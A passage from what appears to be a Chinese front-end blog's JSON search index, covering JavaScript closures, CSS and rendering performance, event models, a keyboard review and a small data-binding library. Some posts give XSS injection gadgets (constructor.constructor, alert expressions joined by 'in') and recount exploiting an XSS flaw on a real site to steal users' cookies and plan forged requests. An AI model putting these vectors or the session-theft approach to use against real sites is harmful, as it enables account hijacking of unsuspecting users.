//如果再在浏览器输入b(),是不会出现\"b外层函数执行\" ,因为函数本身就立即运行一遍就销毁了.    return a2;    }})()\n\n这里在尾部加了一个小括号,但是不传参,然后就立即执行了这个函数，然后就销毁了这个变量b,但是b内部保留着一个闭包,所以在浏览器输入b,还会出现被引用的匿名函数\n\n传参var c = (function(arg){    console.log(\"c外层函数执行\");    console.log(arg);    return function(d){    return d;    }})(333)//这里我们给小括号添加了一个参数,然后立马就传递进这个参数 之后也立即销毁\n劫持eavl()var eval=(function(e){      //这一刻, eval函数被重写    console.log('e的值是:'+e);     //e的值是:function eval(){}    return function(data){        console.log(data);        e(data);    }})(eval);//并非把自己传递进去, 而是传进去原生的eval函数, 用window.eval可验证// var temp = eval;// console.log(\"eval的值:\"+eval); //function (data){console.log(data);e(data);}// eval(\"alert(1)\");  //直接进入这个闭包,然后解析\"alert(1)\";\n实例验证var a=\"global\";function test(){    var a=\"local\";    eval(\"alert(a)\");}test();   // global","url":"/2015/05/12/eval/","link":"","plink":"https://thinkerchan.com/2015/05/12/eval/"},{"title":"如何提升 CSS 选择器性能","content":"CSS样式解析是从右到左的为什么我们在写css样式的时候,几乎都是根据[从左到右]的思维来写的,于是我们就理所当然的认为,浏览器解析CSS的时候, 也是按照从左到右的顺序来的.然而并不是,至于为什么,那就得先了解一下浏览器的渲染原理.这里我在重新梳理一遍,以加深自己对浏览器渲染的认识.\n解答这部分内容引自:\n\n「 How browsers work」\n顾轶灵-知乎回答\n\n\nHTML 经过解析生成 DOM Tree（这个我们比较熟悉）；而在 CSS 解析完毕后，需要将解析的结果与 DOM Tree 的内容一起进行分析建立一棵 Render Tree，最终用来进行绘图。Render Tree 中的元素（WebKit 中称为「renderers」，Firefox 下为「frames」）与 DOM 元素相对应，但非一一对应：一个 DOM 元素可能会对应多个 renderer，如文本折行后，不同的「行」会成为 render tree 种不同的 renderer。也有的 DOM 元素被 Render Tree 完全无视，比如 display:none 的元素。\n在建立 Render Tree 时（WebKit 中的「Attachment」过程），浏览器就要为每个 DOM Tree 中的元素根据 CSS 的解析结果（Style Rules）来确定生成怎样的 renderer。对于每个 DOM 元素，必须在所有 Style Rules 中找到符合的 selector 并将对应的规则进行合并。选择器的「解析」实际是在这里执行的，在遍历 DOM Tree 时，从 Style Rules 中去寻找对应的 selector。\n因为所有样式规则可能数量很大，而且绝大多数不会匹配到当前的 DOM 元素（因为数量很大所以一般会建立规则索引树），所以有一个快速的方法来判断「这个 selector 不匹配当前元素」就是极其重要的。\n如果正向解析，例如「div div p em」，我们首先就要检查当前元素到 html 的整条路径，找到最上层的 div，再往下找，如果遇到不匹配就必须回到最上层那个 div，往下再去匹配选择器中的第一个 div，回溯若干次才能确定匹配与否，效率很低。\n逆向匹配则不同，如果当前的 DOM 元素是 div，而不是 selector 最后的 em，那只要一步就能排除。只有在匹配时，才会不断向上找父节点进行验证。\n但因为匹配的情况远远低于不匹配的情况，所以逆向匹配带来的优势是巨大的。同时我们也能够看出，在选择器结尾加上「*」就大大降低了这种优势，这也就是很多优化原则提到的尽量避免在选择器末尾添加通配符的原因。\n优化方法既然CSS是从右到左匹配,那么就要尽可能提高解析效率.Google 资深web开发工程师 Steve Souders 对 CSS 选择器的执行效率从高到低做了一个排序：\n\n1.id选择器（#myid）2.类选择器（.myclassname）3.标签选择器（div,h1,p）4.相邻选择器（h1+p）5.子选择器（ul &lt; li）6.后代选择器（li a）7.通配符选择器（*）8.属性选择器（a[rel=”external”]）9.伪类选择器（a:hover, li:nth-child）\n\n根据以上「选择器匹配」与「选择器执行效率」原则，我们可以通过避免不恰当的使用，提升 CSS 选择器性能:\n\n避免使用通配符\n避免限制限制 id 选择器\n避免使用标签限制 class 选择器\n避免使用多层标签选择器,可以用class代替\n避免使用子选择器\n使用继承\n\n其他可参考资料\n赵东禹’s blog(墙裂推剑!)","url":"/2015/06/17/effective-css/","link":"","plink":"https://thinkerchan.com/2015/06/17/effective-css/"},{"title":"浏览器渲染原理","content":"本文转载自:阿树-前端工程师为什么需要明白浏览器渲染？\n为什么要理解它像素完美（Pixel Perfection）、分辨率无关（Resolution Independent）和多平台体验一致性是设计师们的追求。 可访问性（Accessability）、加载性能和重构灵活性则是前端工程师们关心的主题。其中加载性能与浏览器的渲染机制深深挂钩，弄明白浏览器背后的渲染机制，才能在日常的前端的开发中明白如何进行性能优化。\n浏览器如何渲染页面浏览器解析1、浏览器通过请求的 URL 进行域名解析，向服务器发起请求，接收文件（HTML、CSS、JS、Images等等）。2、HTML 文件加载后，开始构建 DOM Tree3、CSS 样式文件加载后，开始解析和构建 CSS Rule Tree4、Javascript 脚本文件加载后， 通过 DOM API 和 CSSOM API 来操作 DOM Tree 和 CSS Rule Tree\n浏览器渲染1、浏览器引擎通过 DOM Tree 和 CSS Rule Tree 构建 Rendering Tree2、Rendering Tree 并不与 DOM Tree 对应，比如像 &lt;head&gt; 标签内容或带有 display: none; 的元素节点并不包括在 Rendering Tree 中 。3、通过 CSS Rule Tree 匹配 DOM Tree 进行定位坐标和大小，是否换行，以及 position、overflow、z-index 等等属性，这个过程称为 Flow 或 Layout 。4、最终通过调用Native GUI 的 API 绘制网页画面的过程称为 Paint 。\n参考图:\n当用户在浏览网页时进行交互或通过 js 脚本改变页面结构时，以上的部分操作有可能重复运行，此过程称为 Repaint 或 Reflow。\nrepaint当元素改变的时候，将不会影响元素在页面当中的位置（比如 background-color, border-color, visibility），浏览器仅仅会应用新的样式重绘此元素，此过程称为 Repaint。\nreflow当元素改变的时候，将会影响文档内容或结构，或元素位置，此过程称为 Reflow。（ HTML 使用的是 flow based layout ，也就是流式布局，所以，如果某元件的几何尺寸发生了变化，需要重新布局，也就叫 Reflow。）\n\nReflow 的成本比 Repaint 的成本高得多的多。一个结点的 Reflow 很有可能导致子结点，甚至父点以及同级结点的 Reflow 。在一些高性能的电脑上也许还没什么，但是如果 Reflow 发生在手机上，那么这个过程是延慢加载和耗电的。—-浏览器的渲染原理简介\n\n以下行为将有可能产生 Reflow\n\n增加、删除、或改变 DOM 节点\n增加、删除 ‘class’ 属性值\n元素尺寸改变\n文本内容改变\n浏览器窗口改变大小或拖动\n动画效果进行计算和改变 CSS 属性值\n伪类激活（:hover）\n\n注意事项\n经常操作的DOM节点需要存起来\n单次改动DOM元素的情况尽可能少\n用增减class的方式来替代直接DOM操作\n\n\n\n当然，我们的浏览器是聪明的，它不会像上面那样，你每改一次样式，它就 Reflow 或 Repaint 一次。一般来说，浏览器会把这样的操作积攒一批，然后做一次 Reflow ，这又叫异步 reflow 或增量异步 Reflow 。但是有些情况浏览器是不会这么做的，比如：Resize 窗口，改变了页面默认的字体，等。对于这些操作，浏览器会马上进行 Reflow 。—-浏览器的渲染原理简介\n\n优化渲染过程\n1、创建有效的 HTML 和 CSS ，不要忘记指定文档编码，比如&lt;meta charset=&quot;utf-8&quot;&gt;\n2、CSS 样式应该包含在 &lt;head&gt;中， Javascript 脚本出现在 &lt;body&gt;末尾。\n3、减少 CSS 嵌套层级和选择适当的选择器，可参考 如何提升 CSS 选择器性能。\n4、不要通过 JS 逐条修改 DOM 的样式，提前定义好 CSS 的 Class 进行操作。\n5、尽量减少将 DOM 节点属性值放在循环当中，会导致大量读写此属性值。\n6、尽可能的为产生动画的 HTML 元素使用 fixed 或 absolute 的 position ，那么修改他们的 CSS 是不会 Reflow 的。\n\n其他参考\nhttp://taligarsiel.com/Projects/howbrowserswork1.htm\nhttp://frontendbabel.info/articles/webpage-rendering-101/#how-browsers-optimize-rendering\nhttp://coolshell.cn/articles/9666.html","url":"/2015/06/16/how-browser-work/","link":"","plink":"https://thinkerchan.com/2015/06/16/how-browser-work/"},{"title":"Javscript事件模型","content":"三种模型一.HTMl事件类型常见如 onclick=fn 形式,耦合度高,不利于维护\n二.DOM0级常见标准dom的写法,兼容性最好window.onload=function(){    var input=document.getElementsByTagName('input')[0];    input.onclick=test;}function test(){     //...}\n但是DOM0没法为一个元素原生(可能这个词用得不对)添加一次以上的事件,否则后面的事件就会把前面的覆盖掉btnDOM.onclick = function(){    alert(\"click me!\");           }btnDOM.onclick = function(){         alert(\"click me1111!\");           } //后面的事件会覆盖前面的事件.\n可是:如果硬要在DOM0下为一个元素绑定多个事件,那么还是可以实现的,只不过有点不合理而已\n例子:var btn = document.getElementById('btn');btn.onclick=function(){    alert(1);}var fn = btn.onclick;btn.onclick=function(){    if(fn){        fn();    }    alert(2);}\n三.DOM2模型标准模型\n事件添加:addEventListener(type,fn,bool)\n事件移除:removeEventListener(type,fn,bool)\n\nDOM2事件处理里添加事件使用的是addEventListener，它接收三个参数比IE事件处理多一个，前两个的意思和ie事件处理方法的两个参数一样，唯一的区别就是第一个参数里要去掉on这个前缀，第三个参数是个布尔值，如果它的取值是true，那么事件就按照捕获方式处理，取值为false，事件就是按照冒泡处理，有第三个参数我们可以理解为什么DOM2事件处理里要把事件元素跑个两遍，目的就是为了兼容两种事件模型，不过这里要请注意下，不管我们选择是捕获还是冒泡，两遍遍历是永远进行，如果我们选择一种事件处理方式，那么另外一个事件处理流程里就不会促发任何事件处理函数，这和汽车挂空挡空转的道理一样。通过DOM2事件方法的设计，我们知道DOM2事件在运行时候只能执行两种事件处理方式中的一种，不可能两个事件流体系同时促发，所以虽然元素遍历两遍，但是事件函数绝不可能被促发两遍，注意我这里指不促发两遍是指一个事件函数，其实我们可以模拟两个事件流模型同时执行的情况，例如下面代码：\nbtnDOM.addEventListener(\"click\",ftn,true);  //捕获btnDOM.addEventListener(\"click\",ftn,false);    //冒泡\n但这种写法是多事件处理，相当于我们点击两次按钮。\nDOM2也提供了删除事件的函数，这个函数就是removeEventListener，写法如下：btnDOM.removeEventListener(\"click\",ftn,false);\n使用和IE事件的一样即参数要和定义事件的参数一致，不过removeEventListener使用时候，第三个参数不传，默认是删除冒泡事件，因为第三个参数不传默认都是false，例如：\nbtnDOM.addEventListener(\"click\",ftn,true);btnDOM.removeEventListener(\"click\",ftn);    //没有传第三个参数,默认删除冒泡事件\n运行之，发现事件没有被删除成功, 所以要养成事件添加和删除参数一致的习惯.\nIE模型支持这个模型的还有opera浏览器btnDOM.attachEvent(\"onclick\",function(){\talert(\"Click Me!\");});btnDOM.attachEvent(\"onclick\",function(){   alert(\"Click Me,too!\");    //注意! 后面绑定的事件先触发!逆序触发!}); btnDOM.detachEvent(\"onclick\",function(){   alert(\"Click Me,too!\");});\n运行之，两个弹窗匿名函数都没有被删除，这是怎么回事？原因是在javascript的匿名函数里，两个匿名函数哪怕代码完全一样，javascript都会在内部使用不同变量存储，结果就是我们看到的现象无法删除点击事件的，因此我们的代码要这么写：var ftn = function(){    alert(\"Click Me,too!\");};btnDOM.attachEvent(\"onclick\",ftn);btnDOM.detachEvent(\"onclick\",ftn);\n这样添加的方法和删除的方法就是指向了同一个对象，所以事件删除成功了。这里的场景告诉我们写事件要有个良好的习惯即操作函数要独立定义，不要用匿名函数用成了习惯。\n再说冒泡和捕获冒泡和捕获其实就是事件流处理方式,事件流又是什么呢?事件流就是从页面接受事件的顺序,好比你在一张纸上画了很多个同心圆.如果你把手指放在圆心上，那么你的手指指向的不是一个圆，而是纸上的所有圆。那么究竟是先指到最外面的大圆呢还是最里面的小圆呢,这里肯定会有不同意见,但是可以肯定的是, 所有的圆我们都指到了.这里的意见不一致,就是事件流处理方式不同.以下是IE和Netscape提出的方式.\n冒泡冒泡是由IE提出,从深层元素上升到最上层元素.\n捕获捕获是由网景提出,从外层元素追踪到到最里层元素. 但是对IE兼容性差.\nDOM2事件流三个阶段:\n\n捕获阶段\n目标阶段\n冒泡阶段\n\n由于兼容的问题,我们都采取冒泡阶段来绑定事件.以下是一个常用的事件侦听组件:var EventUtil = {    addHandler: function(element, type, handler){        if (element.addEventListener){            // DOM2            element.addEventListener(type, handler, false); //默认冒泡        } else if (element.attachEvent){            //IE,opera            element.attachEvent(\"on\" + type, handler);        } else {            //DOM0, 注意只对最后一次绑定的事件有效.            element[\"on\" + type] = handler;        }    },    removeHandler: function(element, type, handler){        if (element.removeEventListener){            element.removeEventListener(type, handler, false);        } else if (element.detachEvent){            element.detachEvent(\"on\" + type, handler);        } else {            element[\"on\" + type] = null;        }    }};EventUtil.addHandler(\"div\",\"click\",fn);  //执行","url":"/2014/11/25/js-event/","link":"","plink":"https://thinkerchan.com/2014/11/25/js-event/"},{"title":"【玩物志】Ganss GS87D-性价比最强入门双模机械键盘","content":"背景19年双十一的时候我组了一台黑苹果，自然也要选一个键盘。由于从来没有用过机械键盘，我决定买一个试试，需求如下：\n\n红轴\n简约高颜值\n不要跑马灯\n支持无线，双模更优\n不要太贵\n\n实际上我淘宝收藏夹里面早就收藏了大F的87圣手和minila，心水了好久。可惜缺点是贵，贵不是它们的缺点，是我的缺点。看了看我的钱包，对收藏的大F始终下不了手。\nfilco 87双模圣手二代(红轴 ￥1199)\nfilco minila 奶白色(茶轴 ￥1399)\n购买过程不过Filco忍者圣手二代既然是个公模，那就找一个看起来差不多的。一开始考虑了ikbc，c87系列和w200系列，c87是有线的，w200是2.4g无线，唯独没有双模。\n由于我主机是nuc8，我不太想多占一个usb口，蓝牙无线的话就更加完美了。当然我也不愿意放弃usb链接方式，我可以不用，但是它不能没有。\nikbc c87/w200外观\n价格：\n\nikbc c87白色(红轴 约￥340)\nikbc w200白色(红轴 约￥400)\n\n其实也不是没考虑过60%的键盘，毕竟放办公桌上非常简洁，也方便携带。ikbc poker系列颜值也高，但是考虑到经常用的方向键需要按键组合，还是放弃了。\n图为ikbc poker2\n老规矩，不知道买啥，就往电商平台里面按销量筛选双模机械键盘。之前也做了一点功课，红轴适合我。于是发现了ganss（官方叫迦斯，但大家都称其为高斯） gs87d。蓝牙5.0 type-c双模，模具用的也是和大F87圣手、ikbc c87、w200一样的公模，而且只要不到400元的指导价，比起大F动辄上千的价格，那约等于白菜价，便毫不犹豫下单了。\n双十一优惠价格￥319，通过朋友的渠道，返现6%，所以实际到手￥307，我估计没有多少人买的比这便宜了。\n\n伪开箱今年初手机掉水了坏了，手机存拍的开箱图全都没了（拖延癌的后果）。所以在张大妈里面找的图来凑数，图作者分别是@望天是个饼和@芒果和柚子\n实际上去年双十一的时候，gs87d已经出了新款，而且它是新旧款同时发售（当时极有可能是随机发货）。我拿到快递的时候，还诧异怎么和网上的其他用户的包装不一样，才发现我的是最新款（即便今年在张大妈社区看gs87d的评测，还是有很多人评测的是旧款），所以我可能是最早一批新款gs87d用户。\n区别于旧款，新款做了以下优化：\n\n键盘底部去除logo：更简约\n锂电池换成了干电池：不用担心锂电池衰减了\n背部走线优化：显然是优点\n蓝牙5.0：更省电\n\n新款gs87d包装\n新款gs87d全家福\n新款gs87d背面（走线优化）\n旧款gs87d包装\n旧款gs87d全家福\n旧款gs87d局部\n旧款gs87d接口位置\n实际使用做工方面，到手的时候，感觉非常厚实，装上电池大概980g，差不多两斤的重量，所以随身携带去办公不实际。此外，做工只能说还行，肯定是对得起这个价格的。键帽水口没有毛边和倒刺。\n功能方面，只有用有线模式的情况下才能使用键盘灯，灯光亮度可调节，也可使用呼吸灯模式。灯光只有白灯，因为对我来说灯可有可无，所以也是可以接受的。另外，键盘是支持diy灯光的，喜欢diy的玩家，应该会对这个感兴趣。\n因为我是黑苹果用户，所以fn+alt切换成mac模式，再把win和alt按键互相调换。键盘重启之后没有记忆功能，所以只要键盘不关电源，那这个按键组合是一直作用的。mac开机完毕后，需要主动按键盘，才能触发蓝牙自动连接，时间大概花费2秒。这个比较令人不爽，有时候连续打了好几个字，键盘才刚连上。\n猜测这个主动触发模式，应该是出于省电考虑的。这里有个业余用户的建议，牺牲一点续航，每隔10s发送一次信号检测，主动连上已连接的设备，体验应该更好。\n延迟的话，我觉得还行，我用它来打网易的吃鸡，没感觉到延迟。\n续航方面，从去年双十一到现在用了十个月，我只换过一次电池，无可挑剔。\n手感方面，回车键和空间有点肉，虽然说是用cherry原厂红轴，但是和我之前体验的cherry原厂键盘的手感，还是有不小差距的。想想300出头的价格，那当然是选择原谅它啦！\n总的来说，无论颜值功能手感，gs87d都属于￥300多价格上最能打的一个。追求性价比的朋友，可以考虑。\n其他尽管80%键盘我觉得就挺简约的了，但是久了我觉得60%的键盘更完美，前提是要带标准方向键。所以又暗暗种草了两款60%的键盘。\n1.keydous nj68来自珠海一个小厂的机械键盘，颜值非常高。价位在￥500左右。传说是￥500左右退烧的机械键盘。\n\n2.niz atom 68比较知名的国产静电容键盘，颜值高，据说手感好。不过价格稍贵，双模价格￥860左右。\n\n等我多配一个电脑办公的时候，下次一定。\n\n谢谢你关注我的公众号: 测试狗","url":"/2020/09/01/ganss-gs87d/","link":"","plink":"https://thinkerchan.com/2020/09/01/ganss-gs87d/"},{"title":"Javascript小技巧总结","content":"一.传参和原型链(function test(a){\t\talert(a); })(\"string\");\n借助这个传参方式,可以这么用:\"\".constructor.constructor(\"alert('string')\")();\n说不定可以用作XSS攻击的手段\n二.执行环境执行环境(execution context)的具体实现就是变量对象,也称作上下文对象(variable object)全局执行环境的变量对象就是window.(即window代表全局作用域)\n执行环境栈:(execution context stack), 每个要被执行的函数都会先把函数的  执行环境  [压入]   执行环境栈 ,  函数开始执行 然后 函数在变量对象里创建作用域链对象，函数执行完毕后，这个函数的执行环境就会被执行环境栈弹出, 执行环境栈的控制权由内向外依次交付.作用域链: 函数执行环境被压入到执行环境栈中, 函数就执行了, 函数执行的第一步是在变量对象里构造一个作用域链, 作用域链保证变执行环境里有权访问的变量和函数是有序的\nthis指针构造是和作用域链同时发生的，也就是说在上文变量构建作用域链的同时还会构造一个this对象，this对象也是属于上下文变量，而this变量的值就是当前执行环境外部的上下文变量的一份拷贝.\n三.变量声明(function() {\tvar a = b = 5;})();console.log(b);\t//5console.log(a);\t//error\n把console.log(a)放在下面是因为这个一定会报错,因为变量a执行完就马上被销毁了.b为5很显然,因为这样成了全局变量,它实际上是:b = 5;var a = b;\n应该避免这种很容易让人误会的变量声明方式,除非你必须这么做.\n四.new四部曲(也有说是三部曲)1.创建一个新对象；2.将构造函数的作用域赋给新对象（因此this就指向了这个新对象）;3.执行构造函数中的代码（为这个新对象添加属性）；4.返回这个新建的对象;\n五.thisdocument.getElementById(\"btnTest\").onclick = function(){     alert(this);\t//DOM     sayHi();\t\t\t//object Window     sayHi2(this)\t//DOM\t } function sayHi(){\talert(this);\t } function sayHi2(context){\talert(context); }\n六.修改原则\n不要为实例或者原型添加属性\n不要为实例或者原型添加方法\n不要重定义已经存在的方法\n\n七.避免全局多次调用\n除非必要,变量声明在局部.全局搜索会更慢\n多次访问的数据可以缓存起来\n不要使用with\n\n八.声明优化\n对象字面量\n直接数组\n声明多个变量用逗号分开\n\n九.repaint reflowvar list = document.getElementById(\"mylist\"),\t fragment = docuemnt.createDocumentFragment(),\t item,\t i;\tfor(i=0;i&lt;10;i++){\t\t\titem =document.createElement(\"li\");\t\t\tfragment.appendChild(item);\t\t\titem.appendChild(document.creatTextNode(\"Item:\"+i));\t\t\tlist.appendChild(fragment);\t}\n\n如需更新,尽量使用文档碎片更新(如以上例子)\n尽量最小化这两个的更新\n使用innerHTML来插入节点\n\n十.注意HTMLCollectionHTMLCollection的访问会有巨大的开销.因为每一次访问都是最新获取的结果,可是通常会有这样的情况发生:(囧)var imgs = document.getElementsByTagName('img'); for(var i = 0;i&lt;imgs.length;i++){\t//..... }\n这些都是值得注意的地方:\n\n对getElementsByTagName()的调用\n获取元素childNodes属性\n获取元素attributes属性\n访问特殊集合如:document.forms/document.images等\n\n十一.相等和严格相等用严格相等,避免某些情况下相等符号带来的类型装换","url":"/2015/06/13/js-skill/","link":"","plink":"https://thinkerchan.com/2015/06/13/js-skill/"},{"title":"100.com的一个漏洞(上)","content":"昨晚无聊，就打开欢聚时代的官网，然后一路溜到教育100这个旗下网站，顺带注册了一个账户，身为前端狗，看到那么多input，肯定会有冲动往里面写点什么, 然后就发现了个XSS漏洞。。。。\n上图：\n\n也没打算干什么坏事, 不过这里提醒了开发, 绝对不能相信用户输入的任何内容.","url":"/2015/05/31/loopholes/","link":"","plink":"https://thinkerchan.com/2015/05/31/loopholes/"},{"title":"【快速教程】120行代码理解双向数据绑定","content":"劫持对象属性的get/set特性是双向数据绑定的实现方式. 数据改变的时候, set中触发视图更新函数. 这种思路也就是常见的观察者模式. 手写双向数据绑定, 非常适合作为一道面试题, 它考察了 原型链/变量作用域/闭包/Dom/正则/设计模式等等知识点.\n\n// minivue.jsfunction miniVue(options) {  this.$el = document.querySelector(options.el);  this.$data = options.data;  this.$methods = options.methods;  this.bindings = {}; // data中的某个数据有可能作用到好几个地方, 所以需要存起来用于之后遍历执行更新  this.observer(this.$data);  this.compile(this.$el);}miniVue.prototype = {  constructor:miniVue,  observer:function(data) {    for (var key in data) {      this.bindings[key] = [];      // 这个数组主要用途: 存储对应数据关联的dom节点信息      var arr = this.bindings[key];      // 抽离方法避免闭包问题      this.defineReactive(data,key,data[key],arr)    }  },  defineReactive:function(data,key,value,arr){    // Object.defineProperty执行之后, configurable, enumerble为false    Object.defineProperty(data, key, {      get() {        return value;      },      set(newVal) {        if (newVal !== value) {          value = newVal;          // 同步更新视图          arr.forEach((item)=&gt; {            item.updateView();          })        }      }    })  },  compile:function(el) {    var nodes = ([]).slice.call(el.children);    for (var i = 0; i &lt; nodes.length; i++) {      var node = nodes[i];      // if (node.children.length &gt; 0){      //   this.compile(node)  //递归:防止目标元素有嵌套      // };      if (node.nodeType === 1 &amp;&amp; !!node.childElementCount) {  // 换一种判断        this.compile(node)      }      if (node.nodeType === 1 &amp;&amp; !node.childElementCount &amp;&amp; node.textContent.trim()) {        var v = this.textToExp(node.textContent);        this.recordRelativeDom(node,\"innerText\",v,this)      }      if (node.hasAttribute(\"v-model\")) {        var attrVal = node.getAttribute(\"v-model\");        // 方法1: 优化闭包        node.addEventListener(\"input\", ((i) =&gt; { // 因为闭包原因产生索引错乱,故用IIFE来优化          this.recordRelativeDom(node,\"value\",attrVal,this)          return () =&gt; {            this.$data[attrVal] = nodes[i].value;          }        })(i))        // 方法2: for循环的所有var改let        // this.bindings[attrVal].push(new Notify(node, \"value\", this, attrVal));        // node.addEventListener(\"input\", () =&gt; {        //   this.$data[attrVal] = node.value;        // })      }      if (node.hasAttribute(\"v-html\")) {        var attrVal = node.getAttribute(\"v-html\");        this.recordRelativeDom(node,\"innerHTML\",attrVal,this)      }      if (node.hasAttribute(\"v-text\")) {        var attrVal = node.getAttribute(\"v-text\");        this.recordRelativeDom(node,\"innerText\",attrVal,this)      }      if (node.hasAttribute(\"v-on:click\")) {        var attrVal = node.getAttribute(\"v-on:click\");        node.addEventListener(\"click\", this.$methods[attrVal].bind(this.$data));  //bind用于修正this      }    }  },  recordRelativeDom:function(node,attr,attrVal,vm){    var curData = this.bindings[attrVal]    if(curData){      curData.push(new Notify(node, attr, attrVal, vm));    }else{      console.log('变量'+attrVal+'没有被注册!');    }  },  textToExp:function(text){    var tar,        pieces = text.trim().split(/({{.+?}})/g);    pieces = pieces.map(piece =&gt; {      if (!!piece) {        tar = piece.replace(/^{{|}}$/g, '');      }    });    return tar.trim();  }}function Notify(el, attr, val, vm) {  this.el = el;  this.attr = attr;  this.val = val;  this.vm = vm;  this.updateView();}Notify.prototype = {  constructor:Notify,  updateView:function() {    this.el[this.attr] = this.vm.$data[this.val];  }}\n// index.html&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;  &lt;meta charset=\"UTF-8\"&gt;  &lt;title&gt;120行代码理解双向绑定原理&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=\"app\"&gt;    &lt;div&gt;{{ ok }} &lt;/div&gt;    &lt;div&gt;{{ didi }} &lt;/div&gt;    &lt;div v-html=\"msg\"&gt;&lt;/div&gt;    &lt;div&gt;      &lt;div v-html=\"msg\"&gt;&lt;/div&gt;    &lt;/div&gt;    &lt;input type=\"button\" value=\"加个！\" v-on:click=\"click\"&gt;    &lt;input type=\"text\" v-model=\"msg\"&gt;  &lt;/div&gt;  &lt;script src=\"minivue.js\"&gt;&lt;/script&gt;  &lt;script&gt;    var vm = new miniVue({      el: \"#app\",      data: {        msg: \"&lt;span&gt;hello miniVue&lt;/span&gt;\",        ok:'2333',        didi:\"滴滴一下\"      },      methods: {        click() {          this.msg += \"!\";        },        click1(){          this.ok+=\"?\";        }      }    })  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","url":"/2019/04/28/minivue/","link":"","plink":"https://thinkerchan.com/2019/04/28/minivue/"},{"title":"in操作符","content":"数组里的invar a;a in ['a','b','c'] // false\n解释：尽管数组里面有 a 这个项, 但是检查的确实数组本身的特征, 比如 length,constructor之类的属性var arr = ['one','two','three','four'];arr.five = '5';          //这里是按照 键值 的方式给数组自身添加属性arr.six = '6';          //这里是按照 键值 的方式给数组自身添加属性// arr.push('test');     //给数组内部添加元素4 in arr;   //false 原来的素组不存在第5个元素0 in arr;   //true 存在第1个元素'one' in arr;   //false'five' in arr;  //true, 通过 键值 添加进去的属性'length' in arr;//true 这个是数组本身的特性\n对象里的invar obj = {\"a\":1,\"b\":2,\"c\":3}'a' in obj ; //true,键值属性'constructor' in obj; //true,自身的特性(属性) 其实也是键值属性\n其他    (alert(123))in(alert(321));(alert(123))in\"\"\"\"in(alert(321))\n 像这样的语句,都能执行, 是因为浏览器会先执行了in左右两边的语句,再做出对比.\n 也许在一些XSS漏洞中,这种书写会有帮助.","url":"/2015/05/30/operator-in/","link":"","plink":"https://thinkerchan.com/2015/05/30/operator-in/"},{"title":"100.com的一个漏洞(中)","content":"一上次[100.com的漏洞]貌似还没解决.，我决定再研究下。\n二这回干脆就获取了用户cookie\n\n这就是某个YY用户账户的所有cookie\n问：\n\n如果别人不点击这个页面，那也没用啊\n\n答:\n\n没错， 别人不点确实不能拿到他的cookie， 但是YY的用户数量非常大，只要有人在它的论坛上发一个[能够产生足够大传播量的帖子]，并附上这个已被注入的链接提示用户点击，那也会波及相当数量的受害者。技术和社工行为不能相互分开。\n\n三获取到用户cookie的第一刻，自然想着怎么从返回的cookie里获取到用户id和密码，id自然好说，但是密码通常不好处理，通常会对这个密码进行加密，所以cookie里面的密码也是加密过的。而通常的加密方式是MD5或者SHAx或者双重或者多重调。\n如：MD5(sha1(password))MD5(MD5(sha1(password)))sha1(MD5(password))...\n我用自己YY账户登录拿到cookie之后，看了看对应密码加密之后，尝试上面几种加密组合，和官方得到的不一致。当然也没那么容易能够试验出，除非是他们的后端程序员才能知道加密组合，很有可能，密码在加密的时候，可能还加入了字符串前缀后缀等。\n不过，即便我知道了加密方式也没什么卵用。只要不是admin这种简单的密码，MD5暴力破解都是很困难的事情，何况通常不只是md5一层加密。\n四反正拿到用户明文密码是不可能的，反正cookie已经拿到，我们就能做一些坏事。好比你拿到了XXX前面签名盖章的支票，你已经不用在乎他签名时候的姿势或者那个章放在那里，这个支票你自然能拿去花了。。。\n接下来的自然是伪造请求了。比如说，可以拿这个cookie，到YY论坛发一个贴求包养。。。\n待续","url":"/2015/06/16/play-again/","link":"","plink":"https://thinkerchan.com/2015/06/16/play-again/"},{"title":"再看GET和POST","content":"GET请求据JS高级程序设计:\n\nGET 是最常见的请求类型，最常用于向服务器查询某些信息。必要时，可以将查询字符串参数追加到 URL 的末尾，以便将信息发送给服务器。对 XHR 而言，位于传入 open()方法的 URL 末尾的查询字符串必须经过正确的编码才行。\n\n\nGET 请求可被缓存\nGET 请求保留在浏览器历史记录中\nGET 请求可被收藏为书签\nGET 请求不应在处理敏感数据时使用\nGET 请求有长度限制\nGET 请求只应当用于取回数据\n\nPOST请求\n通常用于向服务器发送应该被保存的数据。 POST 请求应该把数据作为请求的主体提交，而 GET 请求传统上不是这样。 POST 请求的主体可以包含非常多的数据，而且格式不限。\n\n\nPOST 请求不会被缓存\nPOST 请求不会保留在浏览器历史记录中\nPOST 不能被收藏为书签\nPOST 请求对数据长度没有要求\n\n我们所理解的区别表格来源:W3school\n\n\n\n对比\nGet\nPost\n\n\n\n\n后退按钮/刷新\n无害\n重新提交数据\n\n\n书签\n可收藏\n不可收藏\n\n\n缓存\n可缓存\n不可缓存\n\n\n后端获取\nRequest.QueryString获取\nRequest.Form获取\n\n\n编码类型\napplication/x-www-form-urlencoded\napplication/x-www-form-urlencoded 或 multipart/form-data。为二进制数据使用多重编码。\n\n\n数据长度限制\n“通常2048个字符”有误\n无限制\n\n\n数据类型\nASCII字符\n无限制\n\n\n安全性\n不安全\n比Get安全\n\n\n传送差异\nmethod=’get’, action属性无效\naction=”test.asp?a=a”和action=”test.asp”是不一样的\n\n\n数据存放\nURL\nHTTP主体\n\n\n可见性\n可见\n不可见\n\n\n\n涨姿势这篇文章可能有助你理解\nGET和POST与数据如何传递没有关系\nGET和POST是由HTTP协议定义的。在HTTP协议中，Method和Data（URL， Body， Header）是正交的两个概念，也就是说，使用哪个Method与应用层的数据如何传输是没有相互关系的。\n\nHTTP没有要求，如果Method是POST数据就要放在BODY中。也没有要求，如果Method是GET，数据（参数）就一定要放在URL中而不能放在BODY中。\n\n那么，网上流传甚广的这个说法是从何而来的呢？我在HTML标准中，找到了相似的描述。这和网上流传的说法一致。但是这只是HTML标准对HTTP协议的用法的约定。怎么能当成GET和POST的区别呢？\n而且，现代的Web Server都是支持GET中包含BODY这样的请求。虽然这种请求不可能从浏览器发出，但是现在的Web 